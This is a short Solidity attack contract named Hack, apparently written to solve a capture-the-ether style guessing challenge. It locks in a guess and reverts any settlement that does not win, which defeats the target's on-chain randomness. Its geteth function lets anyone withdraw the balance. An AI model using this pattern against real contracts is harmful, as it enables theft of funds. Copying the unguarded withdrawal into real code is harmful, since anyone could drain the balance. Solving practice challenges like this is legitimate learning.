/**
 *Submitted for verification at Etherscan.io on 2022-04-05
*/

pragma solidity ^0.4.21;

interface GuessTheNewNumberChallenge {
    function isComplete() external returns (bool);
    function settle() external;
    function lockInGuess(uint8 n) external payable;
}

contract Hack {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function Hack() public{
    }

    function geteth() public{
        msg.sender.transfer(address(this).balance);
    }

    function Initr(address addr, uint8 n) public payable {
        require(msg.value == 1 ether);
        GuessTheNewNumberChallenge(addr).lockInGuess.value(1 ether)(n);
    }
    
    function InitrTest(address addr, uint8 n) public payable {
        require(msg.value == 0.001 ether);
        GuessTheNewNumberChallenge(addr).lockInGuess.value(0.001 ether)(n);
    }

    function GuessOther(address addr) public {
        GuessTheNewNumberChallenge(addr).settle();
        require(GuessTheNewNumberChallenge(addr).isComplete());
        msg.sender.transfer(address(this).balance);
    }

    function() public payable{
    }
}